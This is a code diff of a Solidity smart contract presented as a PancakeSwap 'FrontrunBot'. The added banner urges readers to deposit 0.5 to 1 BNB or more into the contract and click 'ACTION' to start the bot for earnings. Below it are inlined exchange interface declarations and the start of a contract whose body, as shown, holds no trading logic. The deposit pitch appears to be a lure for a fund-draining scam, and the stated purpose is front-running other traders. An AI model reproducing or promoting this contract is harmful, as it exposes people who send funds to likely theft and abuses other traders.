@@ -1,22 +1,65 @@
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.5.0;
+
+/********************************************************************************************
+
+███████╗██████╗░░█████╗░███╗░░██╗████████╗██████╗░██╗░░░██╗███╗░░██╗██████╗░░█████╗░████████╗
+██╔════╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██╔══██╗██║░░░██║████╗░██║██╔══██╗██╔══██╗╚══██╔══╝
+█████╗░░██████╔╝██║░░██║██╔██╗██║░░░██║░░░██████╔╝██║░░░██║██╔██╗██║██████╦╝██║░░██║░░░██║░░░
+██╔══╝░░██╔══██╗██║░░██║██║╚████║░░░██║░░░██╔══██╗██║░░░██║██║╚████║██╔══██╗██║░░██║░░░██║░░░
+██║░░░░░██║░░██║╚█████╔╝██║░╚███║░░░██║░░░██║░░██║╚██████╔╝██║░╚███║██████╦╝╚█████╔╝░░░██║░░░
+╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░
+
+
+* Make deposit to this contract address! (0.5 BNB - 1 BNB Recomended)
+* Go to write tab and click "ACTION" button to start this BOT!
+* Gas fees average 0.006*2 (0.012 BNB). 
+* Better when there is no burn.
+* If it targets token with 10% burn, that's another 0.04 BNB taken off of 0.3 BNB.
+* Most tokens these days have some burn.
+* Less than 0.3BNB doesn't give you much to work with.
+* Not work on Testnet,
+* So in order for the bot to work properly, I recommend you to fund at least 0.5 BNB.
+* If you want to have more earnings instead, set a value starting from 1 or 2 BNB or more
+
+*********************************************************************************************/
+
+
+// File: https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol
+
+interface IUniswapV1Factory {
+    function getExchange(address) external view returns (address);
+}
+
+// File: https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol
+
+pragma solidity >=0.5.0;
+
+interface IUniswapV1Exchange {
+    function balanceOf(address owner) external view returns (uint);
+    function transferFrom(address from, address to, uint value) external returns (bool);
+    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);
+    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);
+    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
+}
+
+// File: https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeMigrator.sol
+
+pragma solidity >=0.5.0;
+
+interface IPancakeMigrator {
+    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;
+}
+
+// File: contracts/FrontRunBot.sol
+
 pragma solidity ^0.6.6;
- 
-// Import PancakeSwap Libraries Migrator/Exchange/Factory
-import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeMigrator.sol";
-import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 
-contract PancakeswapFrontrunBot {
+contract FrontrunBot {
  
-    string public tokenName;
-    string public tokenSymbol;
     uint frontrun;
- 
- 
-    constructor(string memory _tokenName, string memory _tokenSymbol) public {
-        tokenName = _tokenName;
-        tokenSymbol = _tokenSymbol;
-    }
 
     receive() external payable {}
 
